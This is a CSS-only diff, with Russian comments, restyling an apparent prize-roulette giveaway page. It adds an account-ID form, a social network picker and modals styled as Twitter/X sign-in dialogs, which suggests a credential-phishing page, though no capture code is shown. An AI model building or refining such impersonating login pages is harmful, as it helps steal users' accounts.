@@ -53,7 +53,45 @@
             z-index: -1;
         }
         
-        /* Верхнее меню */
+        /* СЧЕТЧИК ПОБЕДИТЕЛЕЙ - ОБНОВЛЕНО: В ПРАВОМ УГЛУ И ФИКСИРОВАН */
+        .winners-counter {
+            position: fixed;
+            top: 10px;
+            right: 10px; /* Изменено с left на right */
+            background: rgba(20, 35, 60, 0.9);
+            border-radius: 10px;
+            padding: 8px 15px;
+            border: 1px solid #2a3b5a;
+            backdrop-filter: blur(10px);
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            animation: slideInDown 0.5s ease-out;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .winners-counter i {
+            color: #7B68EE;
+            font-size: 14px;
+        }
+        
+        .winners-count {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 18px;
+            background: linear-gradient(90deg, #7B68EE, #8A2BE2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: countPulse 2s infinite;
+        }
+        
+        @keyframes countPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        /* Верхнее меню - ОБНОВЛЕНО */
         .top-menu {
             width: 100%;
             max-width: 800px;
@@ -61,12 +99,105 @@
             justify-content: space-between;
             align-items: center;
             padding: 10px 20px;
+            margin-top: 40px;
             margin-bottom: 20px;
             background: rgba(20, 35, 60, 0.8);
             border-radius: 10px;
             border: 1px solid #2a3b5a;
             backdrop-filter: blur(10px);
             z-index: 100;
+            position: relative;
+        }
+        
+        /* Меню слева с бургером */
+        .menu-left {
+            display: flex;
+            gap: 15px;
+            flex: 1;
+        }
+        
+        .menu-btn {
+            background: linear-gradient(to right, #2a3b5a, #1a2c42);
+            color: #8da1b5;
+            border: 1px solid #2a3b5a;
+            border-radius: 5px;
+            padding: 8px 15px;
+            font-family: Arial, sans-serif;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+            transition: all 0.3s;
+            font-size: 14px;
+        }
+        
+        .menu-btn:hover {
+            background: linear-gradient(to right, #3a4b6a, #2a3c52);
+            transform: translateY(-2px);
+            color: #1877F2;
+        }
+        
+        /* Выпадающее меню */
+        .dropdown-menu {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            background: #1a2c42;
+            border: 1px solid #2a3b5a;
+            border-radius: 5px;
+            min-width: 200px;
+            max-height: 0;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            z-index: 1000;
+            transition: max-height 0.3s ease;
+        }
+        
+        .dropdown-menu.show {
+            max-height: 300px;
+            animation: fadeInDropdown 0.3s ease;
+        }
+        
+        @keyframes fadeInDropdown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .dropdown-item {
+            padding: 12px 15px;
+            cursor: pointer;
+            border-bottom: 1px solid #2a3b5a;
+            transition: all 0.3s;
+            color: #8da1b5;
+            font-weight: 400;
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+        }
+        
+        .dropdown-item:hover {
+            background: #2a3b5a;
+            color: #1877F2;
+        }
+        
+        /* Правая часть меню */
+        .menu-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            flex: 1;
+            justify-content: flex-end;
         }
         
         .language-menu {
@@ -85,12 +216,14 @@
             display: flex;
             align-items: center;
             gap: 8px;
+            min-width: 120px;
+            justify-content: space-between;
         }
         
         .language-dropdown {
             position: absolute;
             top: 100%;
-            left: 0;
+            right: 0;
             background: #1a2c42;
             border: 1px solid #2a3b5a;
             border-radius: 5px;
@@ -103,13 +236,14 @@
         
         .language-dropdown.show {
             display: block;
+            animation: fadeInDropdown 0.3s ease;
         }
         
         .language-option {
             padding: 10px 15px;
             cursor: pointer;
             border-bottom: 1px solid #2a3b5a;
-            transition: background 0.3s;
+            transition: all 0.3s;
             color: #8da1b5;
             font-weight: 400;
             font-family: Arial, sans-serif;
@@ -117,23 +251,12 @@
         
         .language-option:hover {
             background: #2a3b5a;
+            transform: translateX(5px);
         }
         
-        .logo {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 20px;
-            color: #8da1b5;
-            font-weight: 500;
-            letter-spacing: 1px;
-            position: absolute;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-        
-        /* Иконка почты для приза с анимацией */
+        /* Иконка почты для приза */
         .prize-mail-icon {
-            position: relative;
-            margin-left: auto;
+            display: flex;
         }
         
         .prize-mail-btn {
@@ -157,6 +280,7 @@
         .prize-mail-btn:hover:not(:disabled) {
             background: linear-gradient(to right, #3a4b6a, #2a3c52);
             transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
         .prize-badge {
@@ -218,6 +342,18 @@
             text-align: center;
             position: relative;
             box-shadow: 0 0 60px rgba(24, 119, 242, 0.15);
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn {
+            from {
+                opacity: 0;
+                transform: scale(0.8) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
         }
 
         .prize-banner {
@@ -233,6 +369,16 @@
             font-size: 20px;
             clip-path: polygon(5% 0%, 95% 0%, 100% 50%, 95% 100%, 5% 100%, 0% 50%);
             box-shadow: 0 4px 15px rgba(24, 119, 242, 0.4);
+            animation: bannerFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes bannerFloat {
+            0%, 100% {
+                transform: translateX(-50%) translateY(0);
+            }
+            50% {
+                transform: translateX(-50%) translateY(-5px);
+            }
         }
 
         .prize-glow-container {
@@ -265,6 +411,16 @@
             object-fit: contain;
             z-index: 2;
             filter: drop-shadow(0 0 20px rgba(255,255,255,0.2));
+            animation: floatPrize 4s ease-in-out infinite;
+        }
+
+        @keyframes floatPrize {
+            0%, 100% {
+                transform: translateY(0) rotate(0deg);
+            }
+            50% {
+                transform: translateY(-10px) rotate(5deg);
+            }
         }
 
         .prize-name {
@@ -273,6 +429,16 @@
             font-size: 24px;
             margin-bottom: 10px;
             text-transform: uppercase;
+            animation: textGlow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes textGlow {
+            from {
+                text-shadow: 0 0 5px rgba(255,255,255,0.3);
+            }
+            to {
+                text-shadow: 0 0 15px rgba(24, 119, 242, 0.7);
+            }
         }
 
         .prize-desc {
@@ -295,6 +461,16 @@
             cursor: pointer;
             transition: 0.2s;
             box-shadow: 0 5px 0 #0d47a1;
+            animation: buttonPulse 2s infinite;
+        }
+
+        @keyframes buttonPulse {
+            0%, 100% {
+                box-shadow: 0 5px 0 #0d47a1;
+            }
+            50% {
+                box-shadow: 0 5px 0 #0d47a1, 0 0 20px rgba(24, 119, 242, 0.5);
+            }
         }
 
         .collect-btn:active {
@@ -314,33 +490,39 @@
             flex-direction: column;
             align-items: center;
             z-index: 10;
+            animation: containerAppear 0.8s ease-out;
+        }
+
+        @keyframes containerAppear {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
         
         .header {
             text-align: center;
             margin-bottom: 25px;
             width: 100%;
+            animation: slideInDown 0.8s ease-out;
+        }
+
+        @keyframes slideInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
         
-        .header h1 {
-            color: #8da1b5;
-            font-size: 28px;
-            margin-bottom: 8px;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 500;
-            letter-spacing: 1px;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
-        }
-        
-        .header p {
-            color: #8da1b5;
-            font-size: 16px;
-            font-family: Arial, sans-serif;
-            font-weight: 400;
-            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
-        }
-        
-        /* ОБНОВЛЕННЫЙ КОНТЕЙНЕР РУЛЕТКИ - УМЕНЬШЕННЫЙ */
+        /* ОБНОВЛЕННЫЙ КОНТЕЙНЕР РУЛЕТКИ */
         .roulette-container {
             position: relative;
             width: 100%;
@@ -357,9 +539,21 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            animation: rouletteFloat 6s ease-in-out infinite;
+        }
+
+        @keyframes rouletteFloat {
+            0%, 100% {
+                transform: translateY(0);
+                box-shadow: 0 15px 30px rgba(0, 0, 0, 0.6);
+            }
+            50% {
+                transform: translateY(-10px);
+                box-shadow: 0 25px 40px rgba(0, 0, 0, 0.7);
+            }
         }
         
-        /* УМЕНЬШЕННАЯ СЕТКА ПРИЗОВ */
+        /* СЕТКА ПРИЗОВ */
         .prizes-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -401,7 +595,7 @@
         }
         
         .prize-item:hover {
-            transform: translateY(-3px);
+            transform: translateY(-3px) scale(1.05);
             border-color: rgba(24, 119, 242, 0.3);
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
@@ -437,150 +631,82 @@
             opacity: 0.8;
         }
         
-        /* УМЕНЬШЕННАЯ РАМКА ВЫБОРА */
+        /* НОВАЯ РАМКА ВЫБОРА С АНИМАЦИЕЙ ГРАДИЕНТА - ОБНОВЛЕНА */
         .selection-frame {
             position: absolute;
-            border: 2px solid #1877F2;
+            border: 3px solid transparent;
             border-radius: 15px;
+            background: transparent;
             box-shadow: 
-                0 0 20px rgba(24, 119, 242, 0.8),
-                0 0 40px rgba(24, 119, 242, 0.4),
-                inset 0 0 20px rgba(24, 119, 242, 0.2);
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+                inset 0 0 20px rgba(123, 104, 238, 0.3),
+                0 0 20px rgba(123, 104, 238, 0.5);
             z-index: 100;
             pointer-events: none;
             opacity: 0;
-            background: rgba(24, 119, 242, 0.15);
-            backdrop-filter: blur(5px);
             display: flex;
             align-items: center;
             justify-content: center;
+            animation: borderGlow 2s ease-in-out infinite;
         }
-        
-        .selection-frame::before {
-            content: '';
-            position: absolute;
-            top: -6px;
-            left: -6px;
-            right: -6px;
-            bottom: -6px;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 18px;
-            animation: borderRotate 4s linear infinite;
-            pointer-events: none;
-        }
-        
-        .selection-frame::after {
-            content: '';
-            position: absolute;
-            top: 6px;
-            left: 6px;
-            right: 6px;
-            bottom: 6px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 12px;
-            pointer-events: none;
-        }
-        
-        /* Уголки рамки - УМЕНЬШЕННЫЕ */
-        .corner {
-            position: absolute;
-            width: 12px;
-            height: 12px;
-            border: 2px solid #1877F2;
-            opacity: 0.8;
-        }
-        
-        .corner-tl {
-            top: -4px;
-            left: -4px;
-            border-right: none;
-            border-bottom: none;
-            border-top-left-radius: 6px;
-        }
-        
-        .corner-tr {
-            top: -4px;
-            right: -4px;
-            border-left: none;
-            border-bottom: none;
-            border-top-right-radius: 6px;
-        }
-        
-        .corner-bl {
-            bottom: -4px;
-            left: -4px;
-            border-right: none;
-            border-top: none;
-            border-bottom-left-radius: 6px;
-        }
-        
-        .corner-br {
-            bottom: -4px;
-            right: -4px;
-            border-left: none;
-            border-top: none;
-            border-bottom-right-radius: 6px;
+
+        @keyframes borderGlow {
+            0%, 100% {
+                box-shadow: 
+                    inset 0 0 20px rgba(123, 104, 238, 0.3),
+                    0 0 20px rgba(123, 104, 238, 0.5);
+                border-color: rgba(123, 104, 238, 0.5);
+            }
+            50% {
+                box-shadow: 
+                    inset 0 0 30px rgba(123, 104, 238, 0.5),
+                    0 0 30px rgba(123, 104, 238, 0.7);
+                border-color: rgba(123, 104, 238, 0.8);
+            }
         }
         
         .selection-frame.active {
             opacity: 1;
             animation: 
-                pulse 1.2s infinite alternate,
-                glow 2s infinite alternate;
+                borderGlow 2s ease-in-out infinite,
+                frameFloat 3s ease-in-out infinite;
         }
-        
-        @keyframes borderRotate {
-            0% { border-color: rgba(255, 255, 255, 0.3); }
-            25% { border-color: rgba(24, 119, 242, 0.5); }
-            50% { border-color: rgba(255, 255, 255, 0.3); }
-            75% { border-color: rgba(24, 119, 242, 0.5); }
-            100% { border-color: rgba(255, 255, 255, 0.3); }
-        }
-        
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-                box-shadow: 
-                    0 0 20px rgba(24, 119, 242, 0.8),
-                    0 0 40px rgba(24, 119, 242, 0.4),
-                    inset 0 0 20px rgba(24, 119, 242, 0.2);
+
+        @keyframes frameFloat {
+            0%, 100% {
+                transform: translateY(0);
             }
-            100% {
-                transform: scale(1.03);
-                box-shadow: 
-                    0 0 30px rgba(24, 119, 242, 1),
-                    0 0 60px rgba(24, 119, 242, 0.6),
-                    inset 0 0 30px rgba(24, 119, 242, 0.3);
+            50% {
+                transform: translateY(-3px);
             }
         }
         
-        @keyframes glow {
-            0% {
-                background: rgba(24, 119, 242, 0.15);
-            }
-            100% {
-                background: rgba(24, 119, 242, 0.25);
-            }
-        }
-        
-        /* ИНДИКАТОР ВЫБОРА - УМЕНЬШЕННЫЙ */
+        /* ИНДИКАТОР ВЫБОРА */
         .selection-indicator {
             position: absolute;
             top: -30px;
             left: 50%;
             transform: translateX(-50%);
-            background: linear-gradient(135deg, #1877F2, #1153b3);
+            background: linear-gradient(135deg, #7B68EE, #4B0082);
             color: white;
             padding: 6px 15px;
             border-radius: 25px;
             font-weight: bold;
             font-size: 12px;
             white-space: nowrap;
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4);
+            box-shadow: 0 4px 12px rgba(123, 104, 238, 0.4);
             z-index: 101;
             opacity: 0;
             transition: opacity 0.3s;
+            animation: indicatorFloat 2s ease-in-out infinite;
+        }
+
+        @keyframes indicatorFloat {
+            0%, 100% {
+                transform: translateX(-50%) translateY(0);
+            }
+            50% {
+                transform: translateX(-50%) translateY(-3px);
+            }
         }
         
         .selection-indicator::after {
@@ -591,7 +717,7 @@
             transform: translateX(-50%);
             border-left: 8px solid transparent;
             border-right: 8px solid transparent;
-            border-top: 8px solid #1877F2;
+            border-top: 8px solid #7B68EE;
         }
         
         .selection-indicator.show {
@@ -600,8 +726,8 @@
         
         /* КНОПКА ИГРАТЬ */
         .play-btn {
-            background: linear-gradient(180deg, #ffb000 0%, #ff8000 100%);
-            color: #000;
+            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
+            color: white;
             border: none;
             border-radius: 60px;
             padding: 20px 45px;
@@ -609,7 +735,7 @@
             font-weight: 700;
             cursor: pointer;
             box-shadow: 
-                0 8px 25px rgba(255, 128, 0, 0.4),
+                0 8px 25px rgba(123, 104, 238, 0.4),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             margin-bottom: 30px;
@@ -620,6 +746,18 @@
             text-transform: uppercase;
             position: relative;
             overflow: hidden;
+            animation: buttonAppear 1s ease-out;
+        }
+
+        @keyframes buttonAppear {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
         
         .play-btn::before {
@@ -641,9 +779,10 @@
         .play-btn:hover:not(:disabled) {
             transform: translateY(-8px) scale(1.05);
             box-shadow: 
-                0 15px 35px rgba(255, 128, 0, 0.6),
+                0 15px 35px rgba(123, 104, 238, 0.6),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             letter-spacing: 3px;
+            background: linear-gradient(180deg, #8A2BE2 0%, #5D00BA 100%);
         }
         
         .play-btn:hover::before {
@@ -665,6 +804,141 @@
         .play-btn i {
             margin-right: 10px;
             font-size: 20px;
+        }
+        
+        /* ФОРМА ВВОДА ID АККАУНТА */
+        .account-id-section {
+            background: rgba(20, 35, 60, 0.9);
+            border-radius: 20px;
+            padding: 25px;
+            width: 100%;
+            max-width: 600px;
+            display: none;
+            margin-top: 20px;
+            border: 2px solid rgba(24, 119, 242, 0.3);
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.5),
+                inset 0 0 30px rgba(42, 59, 90, 0.2);
+            backdrop-filter: blur(10px);
+            transition: all 0.6s ease;
+        }
+        
+        .account-id-section.active {
+            display: block;
+            animation: slideInUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        
+        .account-id-section h2 {
+            color: #8da1b5;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 500;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .account-id-section p {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #8da1b5;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+        }
+        
+        .id-input-container {
+            margin-bottom: 25px;
+        }
+        
+        .id-label {
+            display: block;
+            margin-bottom: 10px;
+            color: #8da1b5;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            font-weight: 500;
+        }
+        
+        .id-input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(12, 26, 45, 0.7);
+            border: 2px solid #2a3b5a;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            transition: all 0.3s;
+        }
+        
+        .id-input:focus {
+            outline: none;
+            border-color: #1877F2;
+            box-shadow: 0 0 15px rgba(24, 119, 242, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        .id-submit-btn {
+            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
+            color: white;
+            border: none;
+            border-radius: 60px;
+            padding: 18px 35px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 
+                0 10px 30px rgba(123, 104, 238, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            width: 100%;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .id-submit-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255, 255, 255, 0.2),
+                transparent
+            );
+            transition: 0.5s;
+        }
+        
+        .id-submit-btn:hover:not(:disabled) {
+            transform: translateY(-5px);
+            box-shadow: 
+                0 15px 35px rgba(123, 104, 238, 0.6),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            letter-spacing: 2px;
+            background: linear-gradient(180deg, #8A2BE2 0%, #5D00BA 100%);
+        }
+        
+        .id-submit-btn:hover::before {
+            left: 100%;
+        }
+        
+        .id-submit-btn:disabled {
+            background: linear-gradient(45deg, #444, #555);
+            color: #777;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
         /* ФОРМА ВЫБОРА СОЦСЕТИ */
@@ -757,6 +1031,16 @@
             transform: translateY(-5px) scale(1.05);
             border-color: rgba(24, 119, 242, 0.5);
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            animation: socialOptionHover 0.3s ease-out;
+        }
+
+        @keyframes socialOptionHover {
+            from {
+                transform: translateY(0) scale(1);
+            }
+            to {
+                transform: translateY(-5px) scale(1.05);
+            }
         }
         
         .social-option:hover::before {
@@ -770,6 +1054,16 @@
                 0 0 20px rgba(24, 119, 242, 0.4),
                 inset 0 0 10px rgba(24, 119, 242, 0.1);
             transform: scale(1.05);
+            animation: selectedSocial 0.5s ease-out infinite alternate;
+        }
+
+        @keyframes selectedSocial {
+            from {
+                box-shadow: 0 0 20px rgba(24, 119, 242, 0.4);
+            }
+            to {
+                box-shadow: 0 0 30px rgba(24, 119, 242, 0.7);
+            }
         }
         
         .social-icon {
@@ -784,6 +1078,16 @@
             background: rgba(255, 255, 255, 0.1);
             padding: 10px;
             transition: all 0.3s;
+            animation: iconFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes iconFloat {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-5px);
+            }
         }
         
         .social-icon img, .social-icon svg {
@@ -796,6 +1100,16 @@
         .social-option.selected .social-icon {
             background: rgba(24, 119, 242, 0.2);
             transform: scale(1.1);
+            animation: selectedIcon 1s ease-in-out infinite alternate;
+        }
+
+        @keyframes selectedIcon {
+            from {
+                transform: scale(1.1);
+            }
+            to {
+                transform: scale(1.15);
+            }
         }
         
         .social-option span {
@@ -813,7 +1127,7 @@
         
         /* КНОПКА ПОЛУЧИТЬ ПРИЗ */
         .get-prize-btn {
-            background: linear-gradient(180deg, #1877F2 0%, #1153b3 100%);
+            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
             color: white;
             border: none;
             border-radius: 60px;
@@ -822,7 +1136,7 @@
             font-weight: 700;
             cursor: pointer;
             box-shadow: 
-                0 10px 30px rgba(24, 119, 242, 0.4),
+                0 10px 30px rgba(123, 104, 238, 0.4),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             width: 100%;
@@ -836,6 +1150,7 @@
             gap: 15px;
             position: relative;
             overflow: hidden;
+            animation: buttonAppear 1s ease-out 0.5s both;
         }
         
         .get-prize-btn::before {
@@ -857,9 +1172,10 @@
         .get-prize-btn:hover:not(:disabled) {
             transform: translateY(-5px);
             box-shadow: 
-                0 15px 35px rgba(24, 119, 242, 0.6),
+                0 15px 35px rgba(123, 104, 238, 0.6),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             letter-spacing: 2px;
+            background: linear-gradient(180deg, #8A2BE2 0%, #5D00BA 100%);
         }
         
         .get-prize-btn:hover::before {
@@ -876,6 +1192,15 @@
         
         .get-prize-btn i {
             font-size: 20px;
+        }
+        
+        /* Текст "Важно" в форме выбора соцсети */
+        .important-note {
+            text-align: center;
+            color: #8da1b5;
+            font-size: 14px;
+            margin-top: 15px;
+            font-family: Arial, sans-serif;
         }
         
         /* СЕКЦИЯ ПОДТВЕРЖДЕНИЯ */
@@ -904,7 +1229,16 @@
             font-size: 80px;
             color: #4CAF50;
             margin-bottom: 20px;
-            animation: bounce 1s infinite alternate;
+            animation: bounce 1s infinite alternate, rotateConfirmation 5s linear infinite;
+        }
+
+        @keyframes rotateConfirmation {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
         }
         
         @keyframes bounce {
@@ -932,54 +1266,217 @@
             background: rgba(76, 175, 80, 0.1);
             border-radius: 15px;
             border: 1px solid rgba(76, 175, 80, 0.3);
+            animation: messagePulse 3s infinite alternate;
+        }
+
+        @keyframes messagePulse {
+            from {
+                box-shadow: inset 0 0 10px rgba(76, 175, 80, 0.1);
+            }
+            to {
+                box-shadow: inset 0 0 20px rgba(76, 175, 80, 0.3);
+            }
         }
         
-        /* УВЕДОМЛЕНИЯ */
+        /* НОВЫЙ РАЗДЕЛ: ВОПРОСЫ И ОТВЕТЫ */
+        .faq-section {
+            width: 100%;
+            max-width: 800px;
+            margin-top: 40px;
+            margin-bottom: 30px;
+            background: rgba(20, 35, 60, 0.8);
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid #2a3b5a;
+            backdrop-filter: blur(10px);
+            animation: slideInUp 0.8s ease-out 0.5s both;
+        }
+        
+        .faq-section h2 {
+            text-align: center;
+            color: #7B68EE;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .faq-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .faq-item {
+            background: rgba(12, 26, 45, 0.7);
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid #2a3b5a;
+            transition: all 0.3s ease;
+        }
+        
+        .faq-item.active {
+            border-color: #7B68EE;
+            box-shadow: 0 5px 15px rgba(123, 104, 238, 0.3);
+        }
+        
+        .faq-question {
+            padding: 20px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            font-weight: 600;
+            font-size: 16px;
+            color: #8da1b5;
+            transition: all 0.3s;
+        }
+        
+        .faq-question:hover {
+            color: #7B68EE;
+            background: rgba(42, 59, 90, 0.3);
+        }
+        
+        .faq-question i {
+            color: #7B68EE;
+            transition: transform 0.3s;
+            font-size: 18px;
+        }
+        
+        .faq-item.active .faq-question i {
+            transform: rotate(180deg);
+        }
+        
+        .faq-answer {
+            padding: 0 20px;
+            max-height: 0;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            color: #8da1b5;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .faq-item.active .faq-answer {
+            padding: 0 20px 20px 20px;
+            max-height: 300px;
+            animation: fadeInAnswer 0.5s ease;
+        }
+        
+        @keyframes fadeInAnswer {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .faq-answer p {
+            margin-bottom: 10px;
+        }
+        
+        .faq-answer strong {
+            color: #7B68EE;
+        }
+        
+        .faq-answer a {
+            color: #1877F2;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        
+        .faq-answer a:hover {
+            text-decoration: underline;
+            color: #7B68EE;
+        }
+        
+        /* ОБНОВЛЕННЫЕ УВЕДОМЛЕНИЯ - НОВЫЙ ДИЗАЙН */
         .notification {
             position: fixed;
-            top: 20px;
-            right: 20px;
-            background: linear-gradient(135deg, #2a3b5a, #1a2c42);
-            color: #1877F2;
-            padding: 20px 30px;
-            border-radius: 15px;
-            border-left: 5px solid #1877F2;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(135deg, #0a1520, #162436);
+            color: #7B68EE;
+            padding: 25px 35px;
+            border-radius: 20px;
+            border: 2px solid #7B68EE;
             box-shadow: 
-                0 10px 25px rgba(0, 0, 0, 0.4),
-                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+                0 15px 35px rgba(0, 0, 0, 0.6),
+                0 0 30px rgba(123, 104, 238, 0.3);
             display: none;
             z-index: 1001;
             max-width: 350px;
-            animation: slideInRight 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            font-family: Arial, sans-serif;
-            backdrop-filter: blur(10px);
-            font-weight: 500;
+            width: 90%;
+            animation: notificationPopIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            font-family: 'Orbitron', sans-serif;
+            backdrop-filter: blur(15px);
+            font-weight: 600;
+            text-align: center;
+            font-size: 16px;
+            letter-spacing: 1px;
         }
-        
-        .notification.error {
-            color: #ff4444;
-            border-left-color: #ff4444;
-            background: linear-gradient(135deg, #5a1a1a, #3a0a0a);
-        }
-        
-        .notification.success {
-            color: #4CAF50;
-            border-left-color: #4CAF50;
-            background: linear-gradient(135deg, #1a5a1a, #0a3a0a);
-        }
-        
-        @keyframes slideInRight {
+
+        @keyframes notificationPopIn {
             from { 
-                transform: translateX(100%) scale(0.8); 
+                transform: translate(-50%, -50%) scale(0.5);
                 opacity: 0; 
             }
             to { 
-                transform: translateX(0) scale(1); 
+                transform: translate(-50%, -50%) scale(1);
                 opacity: 1; 
             }
         }
         
-        /* ОСТАЛЬНЫЕ СТИЛИ (остаются без изменений) */
+        .notification::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #7B68EE, #4B0082, #8A2BE2);
+            border-radius: 22px;
+            z-index: -1;
+            animation: borderRotate 3s linear infinite;
+        }
+
+        @keyframes borderRotate {
+            0% {
+                filter: hue-rotate(0deg);
+            }
+            100% {
+                filter: hue-rotate(360deg);
+            }
+        }
+        
+        .notification.error {
+            color: #FF6B6B;
+            border-color: #FF6B6B;
+            background: linear-gradient(135deg, #1a0a0a, #2a1a1a);
+        }
+        
+        .notification.error::before {
+            background: linear-gradient(45deg, #FF6B6B, #C21807, #FF5252);
+        }
+        
+        .notification.success {
+            color: #4CAF50;
+            border-color: #4CAF50;
+            background: linear-gradient(135deg, #0a1a0a, #1a2a1a);
+        }
+        
+        .notification.success::before {
+            background: linear-gradient(45deg, #4CAF50, #2E7D32, #81C784);
+        }
+        
+        /* ОСТАЛЬНЫЕ СТИЛИ */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -1012,6 +1509,18 @@
             max-width: 380px;
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
             position: relative;
+            animation: modalAppear 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes modalAppear {
+            from {
+                opacity: 0;
+                transform: scale(0.8) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
         }
         
         .modal-dark {
@@ -1040,9 +1549,10 @@
             color: #333;
         }
         
-        /* Twitter/X стиль - ДВУХЭТАПНЫЙ ВХОД */
+        /* Twitter/X стиль */
         .x-modal-step1 {
             padding: 30px;
+            animation: modalAppear 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         
         .x-logo {
@@ -1050,6 +1560,16 @@
             height: 40px;
             margin: 0 auto 30px;
             display: block;
+            animation: logoFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-5px);
+            }
         }
         
